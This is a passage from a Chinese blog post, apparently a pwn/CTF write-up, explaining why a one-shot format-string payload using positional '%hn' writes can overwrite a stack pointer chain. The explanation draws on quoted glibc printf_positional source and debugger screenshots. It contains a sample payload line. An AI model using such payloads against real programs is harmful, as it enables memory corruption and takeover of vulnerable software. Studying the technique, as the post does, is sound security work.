<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure></div>



<p>现在我们来看看用<code>payload = f&quot;%&#123;part1&#125;c%15$hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;</code>这个会发生什么。首先在前面<code>%xxxc</code>会直接打印占位符，同样的，我们现在关注指向程序名的链条。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120346608.png"
                      class=""
                >

<p>程序在解析<code>%&#123;part1&#125;c%15$hn</code>时，会进入<code>printf_positional</code>进行进一步处理，其中解析的核心函数是 <code>nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</code> 然后会发现解析完前面的内容之后，栈上那个指向程序名的指针并没有被改变。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120419249.png"
                      class=""
                >

<p>当解析完最后一个之后，会进入如下两个switch分支：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:		<span class="comment">/* No arguments.  */</span></span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">			   type and size.  */</span></span><br><span class="line">	  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">	  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">	     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">	     all the types.  */</span></span><br><span class="line">	  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">	    (&amp;specs[cnt].info,</span><br><span class="line">	     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">	     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)				\</span></span><br><span class="line"><span class="meta">	case tag:					\</span></span><br><span class="line"><span class="meta">	  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">	  break</span></span><br><span class="line"></span><br><span class="line">	T (PA_WCHAR, pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:		<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">	T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">	    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:				<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:			<span class="comment">/* All pointers are the same */</span></span><br><span class="line">	T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">	<span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line">		 &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">	    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">	      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">	<span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">	   strings.  We have no way to determine their type.  */</span></span><br><span class="line">	assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">	__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>**第一个 <code>switch</code>**：解析格式说明符并确定各个参数的类型和大小，建立参数类型映射。</p>
<p>**第二个 <code>switch</code>**：根据映射提取实际参数，确保能够正确处理可变参数列表，确保每个参数的类型和大小都被正确使用。</p>
<p>最后会统一处理格式化说明符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line">  <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">    &#123;</span><br><span class="line">      ..............................</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001121745055.png"
                      class=""
                >

<p>这里步过一次后会跳转到这个位置，我们能发现rcx被指向了.&#x2F;pwn，也就是第一次15偏移处的位置，执行两次后就把原来指向程序名的指针修改了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001122059746.png"
                      class=""
                >

<p>之后再处理后，会发现改的是原来的的内容，<code>./</code>被改成了<code>\x08\x12</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001123259237.png"
                      class=""
                >

<p>分析到这其实大体原理已经清晰了，如果硬要从源码分析的话也定位到了相关函数，但感觉再分析下去效率太低了，以后有研究的需求再深入分析吧。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>format string</tag>
      </tags>
  </entry>
</search>
